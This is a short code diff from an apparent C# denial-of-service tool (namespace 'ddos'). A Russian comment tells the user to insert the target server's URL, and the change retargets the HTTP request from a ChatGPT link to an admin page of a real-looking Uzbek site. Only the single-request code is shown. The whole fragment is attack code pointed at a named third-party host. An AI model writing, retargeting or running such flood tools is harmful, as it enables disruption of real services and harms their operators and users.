@@ -11,7 +11,7 @@ namespace ddos
             try
             {
                 // Замените "TARGET_URL" на URL целевого сервера
-                string url = "https://chat.openai.com/c/fb400a2a-cd95-44c8-ae80-1f302bdfe8cf";
+                string url = "https://admin.najottalim.uz/my-groups";
                 HttpClient client = new HttpClient();
                 HttpResponseMessage response = await client.GetAsync(url);
                 Console.WriteLine("Request sent!");
